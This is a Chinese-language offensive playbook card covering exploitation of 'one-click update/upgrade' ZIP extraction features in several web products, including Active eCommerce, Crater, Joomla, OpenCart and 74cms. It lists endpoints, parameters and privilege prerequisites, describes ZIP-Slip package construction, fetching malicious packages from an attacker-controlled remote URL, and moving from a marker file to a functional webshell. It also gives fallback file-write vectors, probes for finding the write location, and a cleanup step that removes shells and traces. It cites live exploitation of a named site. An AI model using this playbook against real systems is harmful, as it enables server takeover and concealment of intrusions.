# 同族案例表：「自更新/升级包解压」家族（按目标类型选入口）

> 写卡依据：各产品公开漏洞 + phpv4.88demo.cn 实战（Active eCommerce 一行）。
> 共同点（类级本质）：**官方“一键升级/更新/安装”功能 = 服务器愿意替你把任意 ZIP 解到代码目录**，
> 鉴权粒度往往只到「管理员/店主」而非超管，且解压路径少做校验（ZIP-Slip）。

## 1. 案例一览

| 产品 | 触发点 | 关键参数 | 前置 | 备注 |
|---|---|---|---|---|
| **Active eCommerce CMS**（Laravel 8，实战） | `POST /update` | `update_zip=<upload_id>`（先 `POST /aiz-uploader` 传包） | 后台管理员 | 解压到**项目根** → 包内要带 `public/` 前缀；含未授权 `/aiz-uploader/download/{id}`（见 active-ecommerce-map.md） |
| **Crater Invoice** `CVE-2026-57863` | `POST /api/v1/update/unzip` + `POST /api/v1/update/copy` | `{"path":"<服务器上已有 zip 路径>"}` | company owner（每个实例都有） | `ZipArchive::extractTo()` 不消毒条目名 → `../../public/shell.php`；copy 可覆盖 `.env`/整库代码 |
| **WordPress UpdateCE 插件** `CVE-2026-56660` | 插件更新处理器 | 上传/远程 zip | 能触发更新流程 | 解压进 web root，条目不校验 → `../` 写外部 |
| **Joomla 5.x** `com_joomlaupdate` | `administrator/.../com_joomlaupdate/extract.php` `task=startExtract` | 上传恶意包 + 提取密码 | Super Admin | 校验用 `basename()` 比较 `.`/`..` → 形同虚设；条目 `../../../webshell.php` |
| **OpenCart 4.x** | `tool/upgrade.download` → `tool/upgrade.install` | `version=../../../owner/repo/releases/...` | 后台（有 `modify` 权限） | 拼接 URL + 文件名，下载任意仓库包再解到 `install/` |
| **74cms** | `GET /apiadmin/Upgrade/unzip` | `path=<zip 路径>` | 后台 token | 先 `Upgrade/download?path=http://...` 让其自己把包下到本地 |
| 通用自研 SaaS | `/api/update`、`/system/upgrade`、`/plugin/install`、`/template/import` | 多为 `file_id`/`path`/`url` | 后台 | 见 SKILL.md §1 路由枚举法 |

## 2. 四种「包从哪来」的取包方式（按目标允许的输入选）

1. **站点自带上传器**（Active eCommerce 的 `aiz-uploader`）：先上传拿到 id → 再把 id 喂给 updater
2. **服务器本地路径**（Crater/74cms）：需先把包放到服务器上（任意文件写 / 上传点 / 头像附件 / 临时文件），
   常与「上传到 `storage/` 再 `../../` 」配合
3. **远程 URL**（OpenCart / 部分自研）：`path=http://your-vps/x.zip`，最能任意控制内容；
   若目标在云上且出网，先起一个临时 HTTP 服务（用完关）
4. **自己拼 URL**（OpenCart 那种字符串拼接）：用 `../` 指向自己控制的仓库/download 路径

## 3. 包构造要点（跨产品通用）

```
p.zip
├── public/xx_marker.php        # 解压根 = 项目根时的落点
├── xx_marker.php               # 解压根 = public/ 时直接用
├── ../../public/xx_marker.php  # ZIP-Slip（条目名校验缺失时）
└── (可选) manifest.json / 版本号文件    # 通过“必须是合法更新包”的基本校验
```
- **只放新增文件名**：同名文件会被直接覆盖（`vendor/`、`config/`、路由文件、`index.php` 都是炸站点高危项）
- 先用**无害 marker**（`<?php echo "MARK".(7*7);`）验证「写得进去 + 解析执行」，拿到 shell 后再换功能型 WebShell
- 若目标会 `unzip` 后做「文件清单比对」或「版本号校验」，就照它官方包的目录结构补齐再藏 payload

## 4. 同一家族的其他「任意文件写」入口（updater 被禁时按顺序换）

系统升级包 → 插件/扩展安装 → 模板/主题上传（含在线模板编辑器） → 语言包导入 →
数据库备份恢复（导入 `.zip/.sql`） → 头像/附件改名 → 导出功能写到 web 目录 → 缓存/日志路径可控 →
数据库 `SELECT ... INTO OUTFILE`（需 FILE 权限 + secure_file_priv 允许）

## 5. 判定「能不能打」的三个探针（各产品通用，别硬解）

1. **上传接口**：非法类型给什么错？是「类型不允许」（有校验但可能绕过）还是「上传失败」（更底层问题）
2. **更新接口**：喂一个不存在的 `update_zip`/`path` → 报错文案会泄露它期望的**参数名与来源**
   （`file does not exist` = 读服务器路径；`invalid upload` = 只收平台内 id）
3. **解压目标**：写一个带唯一文件名（如 `xx_probe_123.txt`）的包，然后按
   `/xx_probe_123.txt`、`/public/xx_probe_123.txt`、`/storage/xx_probe_123.txt` 逐个探查 → 确定真实落点再投 shell

## 6. 收尾

- 删掉服务器上的临时 zip / 上传记录 / 探针文件 / 实际落盘的 shell
- 若触发了真升级（维护态、`version` 字段、缓存重建）→ 校对并恢复
- 站点首页 + 一个业务页复验 200
